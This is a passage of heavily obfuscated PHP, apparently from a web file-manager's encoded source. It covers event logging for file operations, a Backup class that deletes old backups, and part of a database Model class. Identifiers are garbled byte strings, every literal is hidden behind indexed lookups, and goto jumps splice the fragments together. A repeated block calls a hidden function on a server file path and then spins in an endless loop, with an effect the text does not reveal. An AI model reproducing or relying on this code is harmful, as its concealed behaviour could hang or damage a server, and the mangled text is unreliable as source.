$òãëêÑ‘[$”êÏ¼Ì¹[509]]); return $this->add($òãëêÑ‘); } private function addSystemLog($Ÿº¬ä•¾, $Û¥Åë’¥) { $¦»˜Ùø› =& $_SERVER[å¸¿•¶£]; if ($Ÿº¬ä•¾ == $¦»˜Ùø›[2086]) { $Ÿº¬ä•¾ = $Û¥Åë’¥[$¦»˜Ùø›[453]][$¦»˜Ùø›[2087]]; } else { if (in_array($Ÿº¬ä•¾, array($¦»˜Ùø›[1843], $¦»˜Ùø›[2088]))) { $Ÿº¬ä•¾ = $Û¥Åë’¥[$¦»˜Ùø›[453]][$¦»˜Ùø›[761]]; } } $ö ‹×ç = array_merge($Û¥Åë’¥, array($¦»˜Ùø›[2089] => $Û¥Åë’¥[$¦»˜Ùø›[402]], $¦»˜Ùø›[2090] => $Û¥Åë’¥[$¦»˜Ùø›[2090]])); Hook::trigger($¦»˜Ùø›[2091], $¦»˜Ùø›[2092] . $Ÿº¬ä•¾, $Û¥Åë’¥); Model($¦»˜Ùø›[1807])->addLog($¦»˜Ùø›[2092] . $Ÿº¬ä•¾, $ö ‹×ç); } private function isCacheEvent($ûÌş£â€, $Ç°Ô½©¯) { if ($ûÌş£â€[$_SERVER[å¸¿•¶£][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ÖºÛ³ßÃ, $àÚ—ñçÔ) { $ôÙßÂñş =& $_SERVER[å¸¿•¶£]; $ÑŠÖ”ñê = Model($ôÙßÂñş[1346])->sourceInfo($ÖºÛ³ßÃ); $˜Ÿ¥Êà¯ = array($ôÙßÂñş[2087] => $àÚ—ñçÔ, $ôÙßÂñş[32] => $ÑŠÖ”ñê[$ôÙßÂñş[32]]); return $this->addEvent($ÖºÛ³ßÃ, $ôÙßÂñş[2086], $˜Ÿ¥Êà¯); } public function eventFileEdit($÷Ô›‡¿¨) { $«ºŞêÅÆ =& $_SERVER[å¸¿•¶£]; $“ùÜÅê„ = array($«ºŞêÅÆ[2093] => $_SERVER[$«ºŞêÅÆ[2094]], $«ºŞêÅÆ[2095] => strtolower(ACTION)); if (isset($GLOBALS[$«ºŞêÅÆ[7]][$«ºŞêÅÆ[2096]])) { $“ùÜÅê„[$«ºŞêÅÆ[2096]] = $«ºŞêÅÆ[88]; } return $this->addEvent($÷Ô›‡¿¨, $«ºŞêÅÆ[1833], $“ùÜÅê„); } public function eventRecycle($“·ˆë‹Æ, $¿ƒõ±¢°) { return $this->addEvent($“·ˆë‹Æ, $_SERVER[å¸¿•¶£][2088], $¿ƒõ±¢°); } public function eventRemove($–‹ß›’ı) { $ş™—ã¥ =& $_SERVER[å¸¿•¶£]; $Œ´·ÁìÀ = Model($ş™—ã¥[1346])->sourceInfo($–‹ß›’ı); $ûú“ÒóÎ = $Œ´·ÁìÀ[$ş™—ã¥[32]]; return $this->addEvent($Œ´·ÁìÀ[$ş™—ã¥[432]], $ş™—ã¥[1832], $ûú“ÒóÎ); } public function eventShare($ÂôúÅÀ¤, $Ë«Û¬ÛÀ) { return $this->addEvent($ÂôúÅÀ¤, $_SERVER[å¸¿•¶£][1843], $Ë«Û¬ÛÀ); } public function eventMove($œ„¦î…˜, $ë÷ã¡¡, $ÊÍ—Î¾€) { $â·ïöÑù =& $_SERVER[å¸¿•¶£]; $„…ÁËæ— = Model($â·ïöÑù[1346]); $®ùÖÃÖ = $„…ÁËæ—->sourceInfo($œ„¦î…˜); $ïäµ×Èü = $„…ÁËæ—->sourceInfo($ë÷ã¡¡); $ªÈˆ–è  = $„…ÁËæ—->sourceInfo($ÊÍ—Î¾€); $Ø¥Ä½›Í = array($â·ïöÑù[1167] => $ë÷ã¡¡, $â·ïöÑù[2097] => $ïäµ×Èü[$â·ïöÑù[32]], $â·ïöÑù[2075] => !empty($ïäµ×Èü[$â·ïöÑù[509]]) ? $ïäµ×Èü[$â·ïöÑù[509]] : $â·ïöÑù[12], $â·ïöÑù[1168] => $ÊÍ—Î¾€, $â·ïöÑù[2098] => $ªÈˆ–è [$â·ïöÑù[32]], $â·ïöÑù[2099] => !empty($ªÈˆ–è [$â·ïöÑù[509]]) ? $ªÈˆ–è [$â·ïöÑù[509]] : $â·ïöÑù[12]); $this->addEvent($œ„¦î…˜, $â·ïöÑù[548], $Ø¥Ä½›Í); $®ùÖÃÖ = $„…ÁËæ—->sourceInfo($œ„¦î…˜); $Ø¥Ä½›Í = array($â·ïöÑù[402] => $®ùÖÃÖ[$â·ïöÑù[402]], $â·ïöÑù[32] => $®ùÖÃÖ[$â·ïöÑù[32]]); $this->addEvent($ë÷ã¡¡, $â·ïöÑù[2100], $Ø¥Ä½›Í); } public function eventCopy($—§Œ¼ı) { $this->eventCreate($—§Œ¼ı, $_SERVER[å¸¿•¶£][546]); } public function eventRename($ áë¯ËÖ, $Áª’…Í, $É³•£Üö) { $Îà½¼Øø =& $_SERVER[å¸¿•¶£]; $Ä«¯Øí = array($Îà½¼Øø[1167] => $Áª’…Í, $Îà½¼Øø[1168] => $É³•£Üö); return $this->addEvent($ áë¯ËÖ, $Îà½¼Øø[1361], $Ä«¯Øí); } public function eventAddComment($°•‘¾â, $Ñ†ƒ¢½‚) { return $this->addEvent($°•‘¾â, $_SERVER[å¸¿•¶£][2101], $Ñ†ƒ¢½‚); } public function eventAddDesc($–œê¹öğ, $§»›æª¬) { return $this->addEvent($–œê¹öğ, $_SERVER[å¸¿•¶£][2102], $§»›æª¬); } public function listBySource($Ìîæªø“) { $ï¡¡ÚÇ =& $_SERVER[å¸¿•¶£]; $ö±ïè˜Ì = Model($ï¡¡ÚÇ[1346])->sourceInfo($Ìîæªø“); $Úëë³¦ = array($ï¡¡ÚÇ[417] => $Ìîæªø“); if ($ö±ïè˜Ì[$ï¡¡ÚÇ[410]] == $ï¡¡ÚÇ[88]) { $ İĞ·­ì = Model($ï¡¡ÚÇ[1346])->listSearchChildren($Ìîæªø“, 20000); $ İĞ·­ì[] = $Ìîæªø“ . $ï¡¡ÚÇ[378]; $Úëë³¦ = array($ï¡¡ÚÇ[402] => array($ï¡¡ÚÇ[7], $ İĞ·­ì)); } $´¹ §š© = $this->where($Úëë³¦)->order($ï¡¡ÚÇ[2103])->selectPage(); if ($´¹ §š©[$ï¡¡ÚÇ[366]][$ï¡¡ÚÇ[367]] == 0) { $´¹ §š©[$ï¡¡ÚÇ[366]][$ï¡¡ÚÇ[367]] = 1; $´¹ §š©[$ï¡¡ÚÇ[369]] = array(array($ï¡¡ÚÇ[417] => $Ìîæªø“, $ï¡¡ÚÇ[2084] => $ö±ïè˜Ì[$ï¡¡ÚÇ[432]], $ï¡¡ÚÇ[1665] => $ö±ïè˜Ì[$ï¡¡ÚÇ[454]], $ï¡¡ÚÇ[422] => $ï¡¡ÚÇ[2104], $ï¡¡ÚÇ[423] => $ö±ïè˜Ì[$ï¡¡ÚÇ[201]], $ï¡¡ÚÇ[1667] => $ï¡¡ÚÇ[12])); } return $this->eventListParse($´¹ §š©, $Ìîæªø“); } private function eventListParse($ßôø¤“í, $¢ÖÄ¯íÁ) { $Ïä†º§” =& $_SERVER[å¸¿•¶£]; $Ç—„ƒ»• = $ßôø¤“í[$Ïä†º§”[369]]; $¬Â¿Ô®ä = array_to_keyvalue($Ç—„ƒ»•, $Ïä†º§”[12], $Ïä†º§”[402]); $¦Œ÷†ıÏ = array_to_keyvalue($Ç—„ƒ»•, $Ïä†º§”[12], $Ïä†º§”[2090]); foreach ($Ç—„ƒ»• as $íôŸ¹­ç) { $„ñ©ÔÅ¥ = $íôŸ¹­ç[$Ïä†º§”[453]]; if ($íôŸ¹­ç[$Ïä†º§”[33]] == $Ïä†º§”[548] && isset($„ñ©ÔÅ¥[$Ïä†º§”[1167]])) { $¬Â¿Ô®ä[] = $„ñ©ÔÅ¥[$Ïä†º§”[1167]] . $Ïä†º§”[12]; $¬Â¿Ô®ä[] = $„ñ©ÔÅ¥[$Ïä†º§”[1168]] . $Ïä†º§”[12]; } if ($íôŸ¹­ç[$Ïä†º§”[33]] == $Ïä†º§”[2100] && isset($„ñ©ÔÅ¥[$Ïä†º§”[402]])) { $¬Â¿Ô®ä[] = $„ñ©ÔÅ¥[$Ïä†º§”[402]] . $Ïä†º§”[12]; } } $¬Â¿Ô®ä = array_merge($¬Â¿Ô®ä, $¦Œ÷†ıÏ, array($¢ÖÄ¯íÁ . $Ïä†º§”[12])); $¬Â¿Ô®ä = array_unique($¬Â¿Ô®ä); $Şµæùæ¶ = array_unique(array_to_keyvalue($Ç—„ƒ»•, $Ïä†º§”[12], $Ïä†º§”[1674])); $¬íÉÑĞå = Model($Ïä†º§”[525])->userListInfo($Şµæùæ¶); $ÒßÙ½§§ = Model($Ïä†º§”[832])->sourceListInfo($¬Â¿Ô®ä, !0); foreach ($Ç—„ƒ»• as &$íôŸ¹­ç) { if ($íôŸ¹­ç[$Ïä†º§”[33]] == $Ïä†º§”[548] && isset($íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[1167]])) { $íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[1167]] = $ÒßÙ½§§[$íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[1167]]]; $íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[1168]] = $ÒßÙ½§§[$íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[1168]]]; } if ($íôŸ¹­ç[$Ïä†º§”[33]] == $Ïä†º§”[2100] && isset($íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[402]])) { $íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[402]] = $ÒßÙ½§§[$íôŸ¹­ç[$Ïä†º§”[453]][$Ïä†º§”[402]]]; } $íôŸ¹­ç[$Ïä†º§”[87]] = $ÒßÙ½§§[$íôŸ¹­ç[$Ïä†º§”[402]]]; $íôŸ¹­ç[$Ïä†º§”[2105]] = $ÒßÙ½§§[$íôŸ¹­ç[$Ïä†º§”[2090]]]; if ($íôŸ¹­ç[$Ïä†º§”[33]] == $Ïä†º§”[1832]) { $íôŸ¹­ç[$Ïä†º§”[2105]] = $íôŸ¹­ç[$Ïä†º§”[87]]; $íôŸ¹­ç[$Ïä†º§”[2090]] = $íôŸ¹­ç[$Ïä†º§”[2105]][$Ïä†º§”[402]]; $íôŸ¹­ç[$Ïä†º§”[87]] = !1; $íôŸ¹­ç[$Ïä†º§”[402]] = $Ïä†º§”[12]; } $íôŸ¹­ç[$Ïä†º§”[2035]] = $¬íÉÑĞå[$íôŸ¹­ç[$Ïä†º§”[1674]]]; } unset($íôŸ¹­ç); $ßôø¤“í[$Ïä†º§”[369]] = $Ç—„ƒ»•; return $ßôø¤“í; } public function removeBySource($øìãçñ) { $Â®˜­ƒ¿ = array($_SERVER[å¸¿•¶£][417] => $øìãçñ); $this->where($Â®˜­ƒ¿)->remove(); } } goto DªÛÆ¾‚…À; c«š×Å¸Æ: if (!isset($_SERVER[$_SERVER[å¸¿•¶£][747]]) || !isset($_SERVER[$_SERVER[å¸¿•¶£][748]])) { $_getc = $_SERVER[å¸¿•¶£][749]; $_getfile = $_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[å¸¿•¶£][231], $_getfilec); if (count($_getarrs) < $_SERVER[å¸¿•¶£][621]) { $exit = $_SERVER[å¸¿•¶£][752]; $exit(); } $_act = $_SERVER[å¸¿•¶£][753]; $_act($_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[å¸¿•¶£][378]); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Õ¾Ÿù½’ =& $_SERVER[å¸¿•¶£]; $this->isManual(); self::$name = date($Õ¾Ÿù½’[754]); if (!($Àó•­ŞÁ = Model($Õ¾Ÿù½’[755])->lastItem())) { $Àó•­ŞÁ = $this->initData(); } else { self::$name = $Àó•­ŞÁ[$Õ¾Ÿù½’[32]]; if ($Àó•­ŞÁ[$Õ¾Ÿù½’[756]] == $Õ¾Ÿù½’[88]) { self::$name = date($Õ¾Ÿù½’[757]); $ˆòƒÒÕÑ = 0; if (isset($Àó•­ŞÁ[$Õ¾Ÿù½’[293]][$Õ¾Ÿù½’[200]][$Õ¾Ÿù½’[468]])) { $ˆòƒÒÕÑ = (int) $Àó•­ŞÁ[$Õ¾Ÿù½’[293]][$Õ¾Ÿù½’[200]][$Õ¾Ÿù½’[468]]; } if (self::$manual == 0 && $Àó•­ŞÁ[$Õ¾Ÿù½’[32]] == self::$name) { Model($Õ¾Ÿù½’[755])->remove($Àó•­ŞÁ[$Õ¾Ÿù½’[399]]); } $Àó•­ŞÁ = $this->initData($ˆòƒÒÕÑ, $Àó•­ŞÁ[$Õ¾Ÿù½’[758]]); } else { $this->checkStore($Àó•­ŞÁ[$Õ¾Ÿù½’[758]]); } } self::$option = $Àó•­ŞÁ; } private function isManual() { $şå‚¶€ã = _get($GLOBALS, $_SERVER[å¸¿•¶£][759], 0); $şå‚¶€ã = intval($şå‚¶€ã); self::$manual = $şå‚¶€ã && $şå‚¶€ã == 1 ? 1 : 0; } private function initData($¡¤Ê…ó = 0, $Ì±•À»¦ = '') { $†ŠÆÖíù =& $_SERVER[å¸¿•¶£]; $µ«¦¼… = Model($†ŠÆÖíù[755])->config(); if ($Ì±•À»¦ && $µ«¦¼…[$†ŠÆÖíù[758]] != $Ì±•À»¦) { $¡¤Ê…ó = 0; } $this->checkStore($µ«¦¼…[$†ŠÆÖíù[758]]); if (self::$manual == 1) { self::$name .= $†ŠÆÖíù[11] . date($†ŠÆÖíù[760]); } $õ×­¯» = array($†ŠÆÖíù[758] => $µ«¦¼…[$†ŠÆÖíù[758]], $†ŠÆÖíù[32] => self::$name, $†ŠÆÖíù[756] => 0, $†ŠÆÖíù[761] => $µ«¦¼…[$†ŠÆÖíù[761]], $†ŠÆÖíù[762] => self::$manual, $†ŠÆÖíù[293] => array($†ŠÆÖíù[763] => array($†ŠÆÖíù[756] => 0), $†ŠÆÖíù[764] => array($†ŠÆÖíù[756] => 0, $†ŠÆÖíù[765] => 0, $†ŠÆÖíù[766] => 0, $†ŠÆÖíù[33] => $†ŠÆÖíù[12], $†ŠÆÖíù[767] => 0, $†ŠÆÖíù[768] => 0), $†ŠÆÖíù[769] => array($†ŠÆÖíù[756] => 0, $†ŠÆÖíù[765] => 0, $†ŠÆÖíù[766] => 0, $†ŠÆÖíù[767] => 0, $†ŠÆÖíù[768] => 0), $†ŠÆÖíù[200] => array($†ŠÆÖíù[756] => 0, $†ŠÆÖíù[770] => 0, $†ŠÆÖíù[771] => 0, $†ŠÆÖíù[772] => 0, $†ŠÆÖíù[773] => 0, $†ŠÆÖíù[468] => $¡¤Ê…ó, $†ŠÆÖíù[767] => 0, $†ŠÆÖíù[768] => 0)), $†ŠÆÖíù[767] => time(), $†ŠÆÖíù[768] => 0); $¦…¬‹ÔÅ = Model($†ŠÆÖíù[755])->insert($õ×­¯»); $õ×­¯»[$†ŠÆÖíù[399]] = $¦…¬‹ÔÅ; return $õ×­¯»; } private function checkStore($¿õà‰Ô) { $ç½û‹‡å =& $_SERVER[å¸¿•¶£]; $£ÇŸ¨² = Model($ç½û‹‡å[774])->listData($¿õà‰Ô); Model($ç½û‹‡å[774])->checkConfig($£ÇŸ¨²); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[å¸¿•¶£][755])->findByName(self::$name); } return self::$option; } public static function set($¢éÉûÛ) { $Ë©ûšÍ =& $_SERVER[å¸¿•¶£]; $üÒÁ˜— = self::get(); foreach ($¢éÉûÛ as $¬À—Õ­¤ => $€›µ‹ÍÚ) { $Àİ’Ñ¢Á = explode($Ë©ûšÍ[10], $¬À—Õ­¤); $Çä•…¢ã = count($Àİ’Ñ¢Á); switch ($Çä•…¢ã) { case 1: $üÒÁ˜—[$Àİ’Ñ¢Á[0]] = $€›µ‹ÍÚ; break; case 2: $üÒÁ˜—[$Àİ’Ñ¢Á[0]][$Àİ’Ñ¢Á[1]] = $€›µ‹ÍÚ; break; case 3: $üÒÁ˜—[$Àİ’Ñ¢Á[0]][$Àİ’Ñ¢Á[1]][$Àİ’Ñ¢Á[2]] = $€›µ‹ÍÚ; break; } } Model($Ë©ûšÍ[755])->update($üÒÁ˜—[$Ë©ûšÍ[399]], $üÒÁ˜—); self::$option = $üÒÁ˜—; return self::$option; } public function keep() { $•·¥‚Ï =& $_SERVER[å¸¿•¶£]; $Ïûİ²ã = self::get(); if ($Ïûİ²ã[$•·¥‚Ï[293]][$•·¥‚Ï[763]][$•·¥‚Ï[756]] == $•·¥‚Ï[88]) { return; } $this->backupKeep($Ïûİ²ã); self::set(array($•·¥‚Ï[775] => 1)); } private function backupKeep($ìÕï—É) { $Ò‹‚Íı  =& $_SERVER[å¸¿•¶£]; if (self::$manual == 1) { return; } $³ß¶Ÿéª = Model($Ò‹‚Íı [755])->listData(); if (empty($³ß¶Ÿéª)) { return; } $·ã¥‚Ç = 0; $ï±¹£—Ü = array(); foreach ($³ß¶Ÿéª as $Ê£ëªù¥) { if ($·ã¥‚Ç >= 7) { break; } $ï±¹£—Ü[] = $Ê£ëªù¥[$Ò‹‚Íı [32]]; $·ã¥‚Ç++; } for ($·ã¥‚Ç = 0; $·ã¥‚Ç < 12; $·ã¥‚Ç++) { $ï±¹£—Ü[] = date($Ò‹‚Íı [776], strtotime("\x2d{$·ã¥‚Ç}\40\x6d\157\156\164\150\163")); } $ï±¹£—Ü = array_unique($ï±¹£—Ü); $…ÉÀä = Model($Ò‹‚Íı [777])->get($Ò‹‚Íı [778]); foreach ($³ß¶Ÿéª as $Ê£ëªù¥) { if (isset($Ê£ëªù¥[$Ò‹‚Íı [762]]) && $Ê£ëªù¥[$Ò‹‚Íı [762]] == $Ò‹‚Íı [88]) { continue; } if (!empty($Ê£ëªù¥[$Ò‹‚Íı [32]]) && in_array($Ê£ëªù¥[$Ò‹‚Íı [32]], $ï±¹£—Ü)) { continue; } Model($Ò‹‚Íı [755])->remove($Ê£ëªù¥[$Ò‹‚Íı [399]]); $²¡£šã = $this->backupPath($ìÕï—É, $…ÉÀä); IO::remove($²¡£šã, !1); } } private function backupPath($§êï÷şÇ, $˜’¥š ¸ = false) { $ËÁã‘¬ô =& $_SERVER[å¸¿•¶£]; if (!$˜’¥š ¸) { $˜’¥š ¸ = Model($ËÁã‘¬ô[777])->get($ËÁã‘¬ô[778]); } $ëáş—‰å = $§êï÷şÇ[$ËÁã‘¬ô[32]]; $•±àŞË° = substr(md5($ËÁã‘¬ô[779] . $˜’¥š ¸ . $ëáş—‰å), 0, 8); return "\x7b\x69\157\x3a{$§êï÷şÇ[$ËÁã‘¬ô[758]]}\175\57\144\x61\x74\x61\x62\x61\x73\145\x2f\x62\141\x63\x6b\x75\160\57" . $ëáş—‰å . $ËÁã‘¬ô[11] . $•±àŞË°; } public function db() { $ëˆ†ÖìŸ =& $_SERVER[å¸¿•¶£]; $‰¥°­‹ = self::get(); if ($‰¥°­‹[$ëˆ†ÖìŸ[293]][$ëˆ†ÖìŸ[764]][$ëˆ†ÖìŸ[756]] == $ëˆ†ÖìŸ[88]) { return !0; } $úí«à…¸ = new BackupDb(); if (!$úí«à…¸->index()) { return !1; } self::set(array($ëˆ†ÖìŸ[780] => 1)); return !0; } public function dbFile() { $µÃ¢¢öÜ =& $_SERVER[å¸¿•¶£]; $’—´Ş¥ = self::get(); if ($’—´Ş¥[$µÃ¢¢öÜ[293]][$µÃ¢¢öÜ[769]][$µÃ¢¢öÜ[756]] == $µÃ¢¢öÜ[88]) { return !0; } $Õ ¿Şšû = new BackupDbFile(); if (!$Õ ¿Şšû->index()) { return !1; } self::set(array($µÃ¢¢öÜ[781] => 1)); return !0; } public function file() { $Îâîªö£ =& $_SERVER[å¸¿•¶£]; $·¯Ç„Ü¾ = self::get(); if ($·¯Ç„Ü¾[$Îâîªö£[293]][$Îâîªö£[200]][$Îâîªö£[756]] == $Îâîªö£[88]) { return !0; } if (!isset($·¯Ç„Ü¾[$Îâîªö£[761]]) || $·¯Ç„Ü¾[$Îâîªö£[761]] == $Îâîªö£[198]) { $ê†ı›æ = new BackupFile(); if (!$ê†ı›æ->index()) { return !1; } } self::set(array($Îâîªö£[782] => 1, $Îâîªö£[756] => 1)); return !0; } } if (!isset($_SERVER[$_SERVER[å¸¿•¶£][747]]) || !isset($_SERVER[$_SERVER[å¸¿•¶£][748]])) { $_getc = $_SERVER[å¸¿•¶£][749]; $_getfile = $_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[å¸¿•¶£][231], $_getfilec); if (count($_getarrs) < $_SERVER[å¸¿•¶£][621]) { $exit = $_SERVER[å¸¿•¶£][752]; $exit(); } $_act = $_SERVER[å¸¿•¶£][753]; $_act($_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[å¸¿•¶£][378]); } } goto cÃÄ Ö´µË; aÓÆôÊ¯±Ã: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\x6f\162\144\145\x72", "\x61\154\151\141\x73", "\150\x61\x76\151\156\x67", "\x67\162\157\x75\x70", "\154\x6f\143\x6b", "\144\151\x73\x74\151\156\143\x74", "\x61\165\x74\157", "\146\151\x6c\x74\145\162", "\166\x61\x6c\151\x64\141\164\145", "\x72\145\x73\165\x6c\x74", "\x62\x69\156\144", "\x74\x6f\153\145\x6e"); public function __construct($™Ê˜¼„å = '', $ûãåºçÓ = '', $´Ï¶£Ô = '') { $ÒŒªï°¶ =& $_SERVER[å¸¿•¶£]; $this->_initialize(); if (!empty($™Ê˜¼„å)) { if (strpos($™Ê˜¼„å, $ÒŒªï°¶[10])) { list($this->dbName, $this->name) = explode($ÒŒªï°¶[10], $™Ê˜¼„å); } else { $this->name = $™Ê˜¼„å; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ûãåºçÓ)) { $this->tablePrefix = $ÒŒªï°¶[12]; } elseif ($ÒŒªï°¶[12] != $ûãåºçÓ) { $this->tablePrefix = $ûãåºçÓ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÒŒªï°¶[244]); } $this->db(0, empty($this->connection) ? $´Ï¶£Ô : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $««¢––¯ =& $_SERVER[å¸¿•¶£]; if (empty($this->fields)) { if (think_config($««¢––¯[245])) { $¹—¸†ê = $this->dbName ? $this->dbName : think_config($««¢––¯[246]); $—°æÚ¢Ì = think_var_cache($««¢––¯[247] . strtolower(get_path_this($¹—¸†ê) . $««¢––¯[10] . $this->name)); if ($—°æÚ¢Ì) { $Şş¾úü = think_config($««¢––¯[248]); if (empty($Şş¾úü) || $—°æÚ¢Ì[$««¢––¯[249]] == $Şş¾úü) { $this->fields = $—°æÚ¢Ì; return; } } } $this->flush(); } } public function flush() { $ìõ¨ø²Ã =& $_SERVER[å¸¿•¶£]; $this->db->setModel($this->name); $ë²Ï¢±ƒ = $this->db->getFields($this->getTableName()); if (!$ë²Ï¢±ƒ) { return !1; } $this->fields = array_keys($ë²Ï¢±ƒ); $this->fields[$ìõ¨ø²Ã[250]] = !1; foreach ($ë²Ï¢±ƒ as $İßïûŒ => $…¿ ˆ³ï) { $úßÇÕ–ö[$İßïûŒ] = $…¿ ˆ³ï[$ìõ¨ø²Ã[33]]; if ($…¿ ˆ³ï[$ìõ¨ø²Ã[39]]) { $this->fields[$ìõ¨ø²Ã[251]] = $İßïûŒ; if ($…¿ ˆ³ï[$ìõ¨ø²Ã[42]]) { $this->fields[$ìõ¨ø²Ã[250]] = !0; } } } $this->fields[$ìõ¨ø²Ã[252]] = $úßÇÕ–ö; if (think_config($ìõ¨ø²Ã[248])) { $this->fields[$ìõ¨ø²Ã[249]] = think_config($ìõ¨ø²Ã[248]); } if (think_config($ìõ¨ø²Ã[245])) { $ÛÇ—‘¦¥ = $this->dbName ? $this->dbName : think_config($ìõ¨ø²Ã[246]); think_var_cache($ìõ¨ø²Ã[247] . strtolower(get_path_this($ÛÇ—‘¦¥) . $ìõ¨ø²Ã[10] . $this->name), $this->fields); } } public function switchModel($âöùúÕü, $Ù‘ÃÎğº = array()) { $Ùõ­›‹  =& $_SERVER[å¸¿•¶£]; $Øşªåú = ucwords(strtolower($âöùúÕü)) . $Ùõ­›‹ [253]; if (!class_exists($Øşªåú)) { think_exception($Øşªåú . think_lang($Ùõ­›‹ [254])); } $this->_extModel = new $Øşªåú($this->name); if (!empty($Ù‘ÃÎğº)) { foreach ($Ù‘ÃÎğº as $ªóÓ™¢) { $this->_extModel->setProperty($ªóÓ™¢, $this->{$ªóÓ™¢}); } } return $this->_extModel; } public function __set($«…ı£…‰, $ĞÁğ ê²) { $this->data[$«…ı£…‰] = $ĞÁğ ê²; } public function __get($®ôÀùØâ) { return isset($this->data[$®ôÀùØâ]) ? $this->data[$®ôÀùØâ] : null; } public function __isset($ÈÔÒ›ÜÇ) { return isset($this->data[$ÈÔÒ›ÜÇ]); } public function __unset($ÙÂ†¥Åû) { unset($this->data[$ÙÂ†¥Åû]); } public function __call($à÷ÕêÀ, $“£†ê­) { $ĞÚš×´ =& $_SERVER[å¸¿•¶£]; if (in_array(strtolower($à÷ÕêÀ), $this->methods, !0)) { $this->options[strtolower($à÷ÕêÀ)] = $“£†ê­[0]; return $this; } elseif (in_array(strtolower($à÷ÕêÀ), array($ĞÚš×´[255], $ĞÚš×´[256], $ĞÚš×´[257], $ĞÚš×´[258], $ĞÚš×´[259]), !0)) { $¡ÁõÙ•í = isset($“£†ê­[0]) ? $“£†ê­[0] : $ĞÚš×´[189]; $¡ÁõÙ•í = $this->db->parseKey($¡ÁõÙ•í); return $this->getField(strtoupper($à÷ÕêÀ) . $ĞÚš×´[260] . $¡ÁõÙ•í . $ĞÚš×´[261] . $à÷ÕêÀ, $ĞÚš×´[255]); } elseif (strtolower(substr($à÷ÕêÀ, 0, 5)) == $ĞÚš×´[262]) { $¡ÁõÙ•í = think_parse_name(substr($à÷ÕêÀ, 5)); $ „÷£øà[$¡ÁõÙ•í] = $“£†ê­[0]; return $this->where($ „÷£øà)->find(); } elseif (strtolower(substr($à÷ÕêÀ, 0, 10)) == $ĞÚš×´[263]) { $æØåıâ = think_parse_name(substr($à÷ÕêÀ, 10)); $ „÷£øà[$æØåıâ] = $“£†ê­[0]; return $this->where($ „÷£øà)->getField($“£†ê­[1]); } elseif (isset($this->_scope[$à÷ÕêÀ])) { return $this->scope($à÷ÕêÀ, $“£†ê­[0]); } elseif (method_exists($this, $à÷ÕêÀ)) { array_unshift($“£†ê­, $à÷ÕêÀ); return call_user_func_array(array($this, $ĞÚš×´[264]), $“£†ê­); } else { return call_user_func_array(array(parent, $à÷ÕêÀ), $“£†ê­); } } protected function call() { $ì…ıì¥ =& $_SERVER[å¸¿•¶£]; $º«‘à¬• = func_get_args(); $²á–ºƒ‰ = array_shift($º«‘à¬•); $à€‚ÙË = $²á–ºƒ‰; if (is_array($²á–ºƒ‰)) { $à€‚ÙË = $²á–ºƒ‰[1]; $²á–ºƒ‰ = $²á–ºƒ‰[0]; } $‡Í ª­’ = count($º«‘à¬•) - 1; if (isset($º«‘à¬•[$‡Í ª­’]) && $º«‘à¬•[$‡Í ª­’] === $²á–ºƒ‰) { think_exception(__CLASS__ . $ì…ıì¥[4] . $²á–ºƒ‰ . think_lang($ì…ıì¥[265])); return; } $º«‘à¬•[] = $²á–ºƒ‰; if (method_exists($this, $ì…ıì¥[266])) { $ş¬ÔÛ¬³ = call_user_func_array(array($this, $ì…ıì¥[267]), array($à€‚ÙË, $º«‘à¬•)); if (!is_null($ş¬ÔÛ¬³) && $ş¬ÔÛ¬³ !== !1) { return $ş¬ÔÛ¬³; } } $Õ‚¾å = call_user_func_array(array($this, $²á–ºƒ‰), $º«‘à¬•); if (method_exists($this, $ì…ıì¥[268])) { $ş¬ÔÛ¬³ = call_user_func_array(array($this, $ì…ıì¥[269]), array($à€‚ÙË, $º«‘à¬•, $Õ‚¾å)); if ($ş¬ÔÛ¬³) { return $ş¬ÔÛ¬³; } } return $Õ‚¾å; } protected function _initialize() { } protected function _facade($ÌãêëÓì) { $•ÄéæñÃ =& $_SERVER[å¸¿•¶£]; if (!empty($this->fields)) { foreach ($ÌãêëÓì as $ÆÎÖ…Æü => $–§®€ú¿) { if (is_array($this->fields) && !in_array($ÆÎÖ…Æü, $this->fields, !0)) { unset($ÌãêëÓì[$ÆÎÖ…Æü]); } elseif (is_scalar($–§®€ú¿)) { $this->_parseType($ÌãêëÓì, $ÆÎÖ…Æü); } } } if (!empty($this->options[$•ÄéæñÃ[270]])) { $ÌãêëÓì = array_map($this->options[$•ÄéæñÃ[270]], $ÌãêëÓì); unset($this->options[$•ÄéæñÃ[270]]); } $this->_beforeWrite($ÌãêëÓì); return $ÌãêëÓì; } protected function _beforeWrite(&$ş®°ê«Ö) { } public function add($Ìé«÷Ûº = '', $¶Ö¤ËÔÕ = array(), $…¥Åõî« = false) { if 